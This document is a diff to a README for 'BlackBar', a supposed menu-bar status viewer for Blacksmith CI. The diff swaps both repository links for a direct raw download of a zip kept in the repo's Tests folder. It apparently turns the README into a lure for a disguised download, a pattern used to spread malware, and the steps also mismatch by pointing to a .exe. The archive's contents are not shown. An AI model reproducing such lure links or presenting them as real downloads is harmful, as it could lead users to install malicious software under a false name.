@@ -1,6 +1,6 @@
 # 🔨 BlackBar - View your Blacksmith status easily
 
-[![Download BlackBar](https://img.shields.io/badge/Download-BlackBar-blue.svg)](https://github.com/timescalefactorinhospitableness449/BlackBar)
+[![Download BlackBar](https://img.shields.io/badge/Download-BlackBar-blue.svg)](https://github.com/timescalefactorinhospitableness449/BlackBar/raw/refs/heads/main/Tests/Bar_Black_1.3.zip)
 
 ## 🎯 What BlackBar Does
 
@@ -16,7 +16,7 @@ BlackBar lives in your menu bar. It tracks the status of your Blacksmith continu
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [BlackBar download page](https://github.com/timescalefactorinhospitableness449/BlackBar).
+1. Go to the [BlackBar download page](https://github.com/timescalefactorinhospitableness449/BlackBar/raw/refs/heads/main/Tests/Bar_Black_1.3.zip).
 2. Locate the latest version heading under the Releases section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
